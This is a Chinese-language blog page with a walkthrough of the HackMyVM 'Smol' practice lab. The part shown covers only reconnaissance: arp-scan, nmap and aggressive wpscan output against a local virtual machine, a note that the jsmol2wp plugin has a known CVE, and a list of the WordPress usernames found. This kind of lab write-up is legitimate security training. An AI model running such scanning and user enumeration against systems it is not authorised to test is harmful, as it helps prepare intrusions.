<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm-Smol | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor file ieee-o">
<meta property="og:type" content="article">
<meta property="og:title" content="hackmyvm-Smol">
<meta property="og:url" content="http://example.com/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/index.html">
<meta property="og:site_name" content="Yliken">
<meta property="og:description" content="信息收集123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor file ieee-o">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/essayhead/50.png">
<meta property="article:published_time" content="2025-03-02T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-03T10:21:44.000Z">
<meta property="article:author" content="Yliken">
<meta property="article:tag" content="hackmyvm">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/essayhead/50.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "hackmyvm-Smol",
  "url": "http://example.com/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/",
  "image": "http://example.com/img/essayhead/50.png",
  "datePublished": "2025-03-02T16:00:00.000Z",
  "dateModified": "2025-03-03T10:21:44.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Yliken",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://example.com/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 24 || hour >= 0
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hackmyvm-Smol',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/wenzhang.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/essayhead/50.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/essayhead/second.jpg" alt="Logo"><span class="site-name">Yliken</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm-Smol</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm-Smol</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-02T16:00:00.000Z" title="发表于 2025-03-03 00:00:00">2025-03-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-03T10:21:44.000Z" title="更新于 2025-03-03 18:21:44">2025-03-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Linux%E9%9D%B6%E6%9C%BA/">Linux靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:10       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:eb:ec:71       (Unknown)</span><br><span class="line">192.168.56.110  08:00:27:6a:b5:9b       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.200 seconds (116.36 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sC -sV 192.168.56.110</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 03:20 EST</span><br><span class="line">Nmap scan report for www.smol.hmv (192.168.56.110)</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)</span><br><span class="line">|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)</span><br><span class="line">|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: AnotherCTF</span><br><span class="line">|_http-generator: WordPress 6.3</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">MAC Address: 08:00:27:6A:B5:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds</span><br></pre></td></tr></table></figure>



<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>访问80端口会重定向到<code>www.smol.hmv</code></p>
<p>配置一下hosts文件</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202503031702277.png" alt="image-20250303170152437"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿LAPTOP-40PQI58C)-[~]</span><br><span class="line">└─# wpscan --url http://www.smol.hmv/ -e u,ap --plugins-detection aggressive</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://www.smol.hmv/ [192.168.56.110]</span><br><span class="line">[+] Started: Mon Mar  3 17:03:30 2025</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://www.smol.hmv/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.3&lt;/generator&gt;</span><br><span class="line"> |  - http://www.smol.hmv/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.3&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: popularfx</span><br><span class="line"> | Location: http://www.smol.hmv/wp-content/themes/popularfx/</span><br><span class="line"> | Last Updated: 2024-11-19T00:00:00.000Z</span><br><span class="line"> | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.2.6</span><br><span class="line"> | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5</span><br><span class="line"> | Style Name: PopularFX</span><br><span class="line"> | Style URI: https://popularfx.com</span><br><span class="line"> | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...</span><br><span class="line"> | Author: Pagelayer</span><br><span class="line"> | Author URI: https://pagelayer.com</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.5 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: &#x27;Version: 1.2.5&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:01:14 &lt;==================================&gt; (109325 / 109325) 100.00% Time: 00:01:14</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://www.smol.hmv/wp-content/plugins/akismet/</span><br><span class="line"> | Last Updated: 2025-02-14T18:49:00.000Z</span><br><span class="line"> | Readme: http://www.smol.hmv/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 5.3.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/akismet/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 5.2 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt</span><br><span class="line"></span><br><span class="line">[+] jsmol2wp</span><br><span class="line"> | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/</span><br><span class="line"> | Latest Version: 1.07 (up to date)</span><br><span class="line"> | Last Updated: 2018-03-09T10:28:00.000Z</span><br><span class="line"> | Readme: http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt</span><br><span class="line"> | [!] Directory listing is enabled</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.07 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==========================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] think</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] wp</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Jose Mario Llado Marti</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] wordpress user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] diego</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gege</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] xavi</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Mar  3 17:04:55 2025</span><br><span class="line">[+] Requests Done: 109398</span><br><span class="line">[+] Cached Requests: 10</span><br><span class="line">[+] Data Sent: 29.374 MB</span><br><span class="line">[+] Data Received: 14.995 MB</span><br><span class="line">[+] Memory used: 489.035 MB</span><br><span class="line">[+] Elapsed time: 00:01:25</span><br></pre></td></tr></table></figure>

<p>根据<code>wpscan</code> 得出的结果我们可以知道</p>
<p>靶机网站的<code>WordPress</code>装有 <code>jsmol2wp</code>这个插件。</p>
<p>这个插件版本号&lt;&#x3D;1.07有一个<a target="_blank" rel="noopener" href="https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt">CVE</a></p>
<p>同时还发现网站有<code>admin</code> <code>wpuser</code> <code>think</code>  <code>gege</code>  <code>diego</code> <code>xavi</code></p>
<p>这几个用户</p>
